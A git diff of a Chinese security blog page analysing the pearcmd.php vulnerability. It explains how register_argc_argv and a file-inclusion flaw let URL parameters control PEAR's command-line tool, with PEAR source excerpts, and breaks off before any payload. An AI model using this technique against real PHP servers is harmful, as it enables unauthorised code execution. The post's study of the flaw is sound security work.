@@ -5,7 +5,16 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="浅析pearcmd.php漏洞, hybcx&#39;s blog">
-    <meta name="description" content="">
+    <meta name="description" content="0x01 环境准备
+
+安装php
+
+apt-get install php7.4
+
+安装pear
+
+apt-get install php-pear
+不过这里搭环境有点费劲，最终还是选择docker吧，这里直接拉取php-7.4:apach">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,27 +22,48 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
     <title>浅析pearcmd.php漏洞 | hybcx&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
+    
 
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
 
-    <script src="/libs/jquery/jquery.min.js"></script>
+    <!-- bg-cover style     -->
 
-<meta name="generator" content="Hexo 6.3.0">
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
-
-
 
 
 <body>
@@ -45,7 +75,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">hybcx&#39;s blog</span>
+                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                 </a>
             </div>
             
@@ -135,6 +165,11 @@
       <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
     </a>
   </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
 </ul>
 
 
@@ -151,8 +186,6 @@
             
         </div>
     </div>
-
-    
 
     <ul class="menu-list mobile-menu-list">
         
@@ -330,99 +363,7 @@
 <main class="post-container content">
 
     
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        padding: 35px 0 15px 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        padding-bottom: 30px;
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-
-        position: absolute;
-        right: 23.5vw;
-        display: block;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
+    <div class="row">
     <div id="main-content" class="col s12 m12 l9">
         <!-- 文章内容详情 -->
 <div id="artDetail">
@@ -463,12 +404,32 @@
                 
 
                 
-
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-12-22
+                </div>
                 
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.4k
+                </div>
+                
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    10 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
             </div>
         </div>
         <hr class="clearfix">
@@ -486,11 +447,11 @@
 <ul>
 <li>安装php</li>
 </ul>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install php7.4<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> php7.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <ul>
 <li>安装pear</li>
 </ul>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install php-pear<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> php-pear<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>不过这里搭环境有点费劲，最终还是选择docker吧，这里直接拉取php-7.4:apache运行即可</p>
 <h1>0x02 前置知识</h1>
 <p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；</p>
@@ -501,15 +462,92 @@
 <p>（1）.要开启register_argc_argv这个选项在Docker中是自动开启的</p>
 <p>（2）.要有文件包含的利用</p>
 <p>我们再来看一下pearcmd.php可以接受哪些命令</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Commands:<br>build                  Build an Extension From C Source<br>bundle                 Unpacks a Pecl Package<br>channel-add            Add a Channel<br>channel-alias          Specify an alias to a channel name<br>channel-delete         Remove a Channel From the List<br>channel-discover       Initialize a Channel from its server<br>channel-info           Retrieve Information on a Channel<br>channel-login          Connects and authenticates to remote channel server<br>channel-logout         Logs out from the remote channel server<br>channel-update         Update an Existing Channel<br>clear-cache            Clear Web Services Cache<br>config-create          Create a Default configuration file<br>config-get             Show One Setting<br>config-help            Show Information About Setting<br>config-set             Change Setting<br>config-show            Show All Settings<br>convert                Convert a package.xml 1.0 to package.xml 2.0 format<br>cvsdiff                Run a "cvs diff" for all files in a package<br>cvstag                 Set CVS Release Tag<br>download               Download Package<br>download-all           Downloads each available package from the default channel<br>info                   Display information about a package<br>install                Install Package<br>list                   List Installed Packages In The Default Channel<br>list-all               List All Packages<br>list-channels          List Available Channels<br>list-files             List Files In Installed Package<br>list-upgrades          List Available Upgrades<br>login                  Connects and authenticates to remote server [Deprecated in favor of channel-login]<br>logout                 Logs out from the remote server [Deprecated in favor of channel-logout]<br>makerpm                Builds an RPM spec file from a PEAR package<br>package                Build Package<br>package-dependencies   Show package dependencies<br>package-validate       Validate Package Consistency<br>pickle                 Build PECL Package<br>remote-info            Information About Remote Packages<br>remote-list            List Remote Packages<br>run-scripts            Run Post-Install Scripts bundled with a package<br>run-tests              Run Regression Tests<br>search                 Search remote package database<br>shell-test             Shell Script Test<br>sign                   Sign a package distribution file<br>svntag                 Set SVN Release Tag<br>uninstall              Un-install Package<br>update-channels        Update the Channel List<br>upgrade                Upgrade Package<br>upgrade-all            Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]<br>Usage: pear [options] command [command-options] &lt;parameters&gt;<br>Type "pear help options" to list all options.<br>Type "pear help shortcuts" to list all command shortcuts.<br>Type "pear help version" or "pear version" to list version information.<br>Type "pear help &lt;command&gt;" to get the help for the specified command.<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Commands:
+build                  Build an Extension From C Source
+bundle                 Unpacks a Pecl Package
+channel-add            Add a Channel
+channel-alias          Specify an alias to a channel name
+channel-delete         Remove a Channel From the List
+channel-discover       Initialize a Channel from its server
+channel-info           Retrieve Information on a Channel
+channel-login          Connects and authenticates to remote channel server
+channel-logout         Logs out from the remote channel server
+channel-update         Update an Existing Channel
+clear-cache            Clear Web Services Cache
+config-create          Create a Default configuration file
+config-get             Show One Setting
+config-help            Show Information About Setting
+config-set             Change Setting
+config-show            Show All Settings
+convert                Convert a package.xml 1.0 to package.xml 2.0 format
+cvsdiff                Run a "cvs diff" for all files in a package
+cvstag                 Set CVS Release Tag
+download               Download Package
+download-all           Downloads each available package from the default channel
+info                   Display information about a package
+install                Install Package
+list                   List Installed Packages In The Default Channel
+list-all               List All Packages
+list-channels          List Available Channels
+list-files             List Files In Installed Package
+list-upgrades          List Available Upgrades
+login                  Connects and authenticates to remote server [Deprecated in favor of channel-login]
+logout                 Logs out from the remote server [Deprecated in favor of channel-logout]
+makerpm                Builds an RPM spec file from a PEAR package
+package                Build Package
+package-dependencies   Show package dependencies
+package-validate       Validate Package Consistency
+pickle                 Build PECL Package
+remote-info            Information About Remote Packages
+remote-list            List Remote Packages
+run-scripts            Run Post-Install Scripts bundled with a package
+run-tests              Run Regression Tests
+search                 Search remote package database
+shell-test             Shell Script Test
+sign                   Sign a package distribution file
+svntag                 Set SVN Release Tag
+uninstall              Un-install Package
+update-channels        Update the Channel List
+upgrade                Upgrade Package
+upgrade-all            Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]
+Usage: pear [options] command [command-options] &lt;parameters&gt;
+Type "pear help options" to list all options.
+Type "pear help shortcuts" to list all command shortcuts.
+Type "pear help version" or "pear version" to list version information.
+Type "pear help &lt;command&gt;" to get the help for the specified command.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="2-1-原理">2.1 原理</h2>
 <p>php的pear扩展是一个命令行扩展管理工具，默认的安装路径在<code>/usr/local/lib/php/pearcmd.php</code>，在命令行下可以用<code>pear</code>或<code>php /usr/local/lib/php/pearcmd.php</code>运行，虽然不是在web的目录下，但是如果存在文件包含漏洞，我们就可以运行这个命令行工具</p>
 <p>我们再来看<code>register_argc_argv</code>选项，在这个选项字段如果选了<code>ON</code>的话，URL中?后面的内容会全部传入至<code>$_SERVER['argv']</code>这个变量内，无论后面的内容是否有等号。</p>
 <p>pear会在<code>pearcmd.php</code>获取命令行参数</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 这一行代码设置 PEAR 命令的前端类型为 CLI。这意味着接下来的 PEAR 命令将在命令行界面中执行。</span><br><span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">setFrontendType</span>(<span class="hljs-string">'CLI'</span>);<br><span class="hljs-comment">//这一行获取所有可用的 PEAR 命令</span><br><span class="hljs-variable">$all_commands</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getCommands</span>();<br><br><span class="hljs-comment">//读取 PHP 的命令行参数，并将其存储在 $argv 变量中。这是为了获取用户在命令行中输入的参数。</span><br><span class="hljs-variable">$argv</span> = <span class="hljs-title class_">Console_Getopt</span>::<span class="hljs-title function_ invoke__">readPHPArgv</span>();<br><span class="hljs-comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">php_sapi_name</span>() != <span class="hljs-string">'cli'</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]) &amp;&amp; <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">'--'</span>) {<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-variable">$argv</span> = <span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-variable">$argv</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">上面的if代码块处理 CGI sapi 的特殊情况。如果当前的 PHP 运行环境不是 CLI（Command Line Interface），并且 $argv 中的第二个参数是 '--'，则移除这个 '--' 参数。这可能是为了处理在 CGI 环境下调用 PEAR 命令时的一些特殊情况。<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 这一行代码设置 PEAR 命令的前端类型为 CLI。这意味着接下来的 PEAR 命令将在命令行界面中执行。</span>
+<span class="token class-name static-context">PEAR_Command</span><span class="token operator">::</span><span class="token function">setFrontendType</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'CLI'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//这一行获取所有可用的 PEAR 命令</span>
+<span class="token variable">$all_commands</span> <span class="token operator">=</span> <span class="token class-name static-context">PEAR_Command</span><span class="token operator">::</span><span class="token function">getCommands</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//读取 PHP 的命令行参数，并将其存储在 $argv 变量中。这是为了获取用户在命令行中输入的参数。</span>
+<span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token class-name static-context">Console_Getopt</span><span class="token operator">::</span><span class="token function">readPHPArgv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">php_sapi_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'cli'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'--'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token function">array_values</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">上面的if代码块处理 CGI sapi 的特殊情况。如果当前的 PHP 运行环境不是 CLI（Command Line Interface），并且 $argv 中的第二个参数是 '--'，则移除这个 '--' 参数。这可能是为了处理在 CGI 环境下调用 PEAR 命令时的一些特殊情况。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>而pear获取命令行参数的函数<code>Consoles/Getopt.php-&gt;readPHPArgv()</code>中</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readPHPArgv</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$argv</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$argv</span>)) {<br>            <span class="hljs-keyword">if</span> (!@<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'argv'</span>])) {<br>                <span class="hljs-keyword">if</span> (!@<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">'HTTP_SERVER_VARS'</span>][<span class="hljs-string">'argv'</span>])) {<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">"Could not read cmd args (register_argc_argv=Off?)"</span>;<br>                    <span class="hljs-keyword">return</span> PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<span class="hljs-string">"Console_Getopt: "</span> . <span class="hljs-variable">$msg</span>);<br>                }<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">'HTTP_SERVER_VARS'</span>][<span class="hljs-string">'argv'</span>];<br>            }<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'argv'</span>];<br>        }<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$argv</span>;<br>    }<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">readPHPArgv</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">global</span> <span class="token variable">$argv</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_SERVER_VARS'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Could not read cmd args (register_argc_argv=Off?)"</span><span class="token punctuation">;</span>
+                    <span class="token keyword">return</span> <span class="token class-name static-context">PEAR</span><span class="token operator">::</span><span class="token function">raiseError</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Console_Getopt: "</span> <span class="token operator">.</span> <span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">return</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_SERVER_VARS'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">return</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token variable">$argv</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>会先尝试<code>$argv</code>变量（这个变量储存在命令行模式下运行php脚本时传入的参数），然后再尝试<code>$_SERVER['argv']</code>变量，<code>$_SERVER['argv']</code>为我们可控的变量，这样，在文件包含的场景下，我们就可以运行pear命令行工具并用GET请求参数控制pear的命令行参数了。</p>
 <p>$_SERVER[‘argv’]所获取的数组，就是在命令行模式下argv[0]是脚本名，后边依次为参数</p>
 <h2 id="2-2-register-argc-argv">2.2 register_argc_argv</h2>
@@ -520,16 +558,46 @@
 <blockquote>
 <p>不需要开启php.ini，即可通过$_SERVER[‘argv’]获取命令行参数，和cmd一样</p>
 </blockquote>
-<p><img src="image-20231112143311269.png" alt="image-20231112143311269"></p>
+<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112143311269.png" alt="image-20231112143311269"></p>
 <ul>
 <li>web模式</li>
 </ul>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在web模式下必须在php.ini开启register_argc_argv配置项<br>设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果<br>这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]<br>cli模式下的argv在web模式下不适用<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">在web模式下必须在php.ini开启register_argc_argv配置项
+设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果
+这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]
+cli模式下的argv在web模式下不适用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>该变量是对queryString以+号进行切割，而不是&amp;</strong></p>
-<p><img src="image-20231112143957125.png" alt="image-20231112143957125"></p>
-<p><img src="image-20231112150040595.png" alt="image-20231112150040595"></p>
+<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112143957125.png" alt="image-20231112143957125"></p>
+<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112150040595.png" alt="image-20231112150040595"></p>
 <h2 id="2-3-register-argc-argv和pear的联系">2.3 register_argc_argv和pear的联系</h2>
-<figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-comment"># first find which PHP binary to use</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">"x<span class="hljs-variable">$PHP_PEAR_PHP_BIN</span>"</span> != <span class="hljs-string">"x"</span>; <span class="hljs-keyword">then</span><br>  PHP=<span class="hljs-string">"<span class="hljs-variable">$PHP_PEAR_PHP_BIN</span>"</span><br><span class="hljs-keyword">else</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">"/usr/bin/php"</span> = <span class="hljs-string">'@'</span>php_bin<span class="hljs-string">'@'</span>; <span class="hljs-keyword">then</span><br>    PHP=php<br>  <span class="hljs-keyword">else</span><br>    PHP=<span class="hljs-string">"/usr/bin/php"</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># then look for the right pear include dir</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">"x<span class="hljs-variable">$PHP_PEAR_INSTALL_DIR</span>"</span> != <span class="hljs-string">"x"</span>; <span class="hljs-keyword">then</span><br>  INCDIR=<span class="hljs-variable">$PHP_PEAR_INSTALL_DIR</span><br>  INCARG=<span class="hljs-string">"-d include_path=<span class="hljs-variable">$PHP_PEAR_INSTALL_DIR</span>"</span><br><span class="hljs-keyword">else</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">"/usr/share/php"</span> = <span class="hljs-string">'@'</span>php_dir<span class="hljs-string">'@'</span>; <span class="hljs-keyword">then</span><br>    INCDIR=`<span class="hljs-built_in">dirname</span> <span class="hljs-variable">$0</span>`<br>    INCARG=<span class="hljs-string">""</span><br>  <span class="hljs-keyword">else</span><br>    INCDIR=<span class="hljs-string">"/usr/share/php"</span><br>    INCARG=<span class="hljs-string">"-d include_path=/usr/share/php"</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">exec</span> <span class="hljs-variable">$PHP</span> -C -q <span class="hljs-variable">$INCARG</span> -d date.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=<span class="hljs-string">""</span> -d safe_mode=0 -d register_argc_argv=<span class="hljs-string">"On"</span> -d auto_prepend_file=<span class="hljs-string">""</span> -d auto_append_file=<span class="hljs-string">""</span> <span class="hljs-variable">$INCDIR</span>/pearcmd.php <span class="hljs-string">"<span class="hljs-variable">$@</span>"</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
+
